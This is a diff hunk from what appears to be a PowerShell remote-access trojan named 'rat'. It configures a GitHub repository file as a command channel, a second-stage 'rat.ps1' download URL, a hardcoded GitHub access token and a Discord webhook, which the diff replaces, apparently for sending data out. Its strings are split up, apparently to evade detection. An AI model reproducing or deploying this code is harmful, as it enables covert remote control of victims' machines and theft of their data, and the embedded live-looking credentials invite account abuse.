@@ -5,7 +5,7 @@
 $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
 $T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
 $RA='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'rat.ps1'
-$W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'MTU0NjI1Mzk3OTQ1NTk4Nzc0Mg.GpsZAj.vJYkhN5gQMB7J00vIB2vnSq57d2l6-luMeoWIc'
+$W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'MTU0NjI1Mzk3OTQ1NTk4Nzc0Mg.GpQWle.1R9nKWJPOgt3-AmlOmxrOlb9EvZCg4KPzY35gE'
 $S=Join-Path $env:TEMP 'r_s.tmp'
 $script:P=2000
 $L='1523845613177929828'
